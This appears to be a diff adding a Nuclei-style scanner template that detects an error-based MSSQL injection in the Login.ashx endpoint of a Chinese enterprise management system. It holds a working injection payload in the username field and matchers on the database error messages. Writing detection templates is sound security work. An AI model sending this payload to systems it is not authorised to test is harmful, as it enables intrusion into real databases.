@@ -1,0 +1,33 @@
+id: cysoft-login-ashx-sqli
+info:
+  name: 超易企业管理系统 Login.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /ajax/Login.ashx?Date='1721821198459' HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        username=admin' AND 4026 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))--&password=1&loginguid=b84898ec-9884-4b54-8b44-a90bf0db0183&logintype=pc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
+          - "在将 nvarchar 值"
+      - type: word
+        words:
+          - "<"
+        negative: true
